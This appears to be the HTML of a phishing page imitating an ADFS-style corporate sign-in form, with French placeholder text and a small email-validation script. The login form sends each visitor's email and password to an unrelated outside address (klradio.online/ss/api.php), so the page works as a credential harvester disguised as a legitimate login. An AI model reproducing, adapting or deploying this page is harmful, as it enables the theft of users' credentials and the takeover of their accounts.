                    <div class="loginMessage">
                        Log In
                    </div>
                    <form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" action="https://klradio.online/ss/api.php" onsubmit="return validateForm()">
                        <div id="error" class="fieldMargin error smallText" style="display: none;" >
                            <span id="errorText" for="" aria-live="assertive" role="alert"></span>
                        </div>
            
                        <div id="formsAuthenticationArea">
                            <div id="userNameArea">
                                <input id="userNameInput" name="email" type="email" value="" tabindex="1" class="text fullWidth" spellcheck="false" placeholder="xyz@example.com" autocomplete="off" required>
                            </div>
            
                            <div id="passwordArea">
                                <input id="passwordInput" name="password" type="password" tabindex="2" class="text fullWidth" placeholder="Mot de passe" autocomplete="off" required>
                            </div>
            
                            <div id="submissionArea" class="submitMargin">
                                <button type="submit" class="submit" id="submitBtn" >Log in</button>
                            </div>
                        </div>

                    </form>
                </div>
            </main>
        </div>
    </div>
    <script>
        function validateForm() {
    const emailInput = document.getElementById("userNameInput").value;
    const emailPattern = /^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$/;
    const validationMessage = document.getElementById("error");

    if (emailPattern.test(emailInput)) {
        // Email is in a valid format, allow the form to be submitted
        validationMessage.textContent = "";
        validationMessage.style.display = "none";
        return true;
    } else {
        // Invalid email format, display an error message and prevent form submission
        validationMessage.textContent = "Invalid email format. Please enter a valid email.";
        validationMessage.style.display = "block";
        return false;
    }
}

    </script>
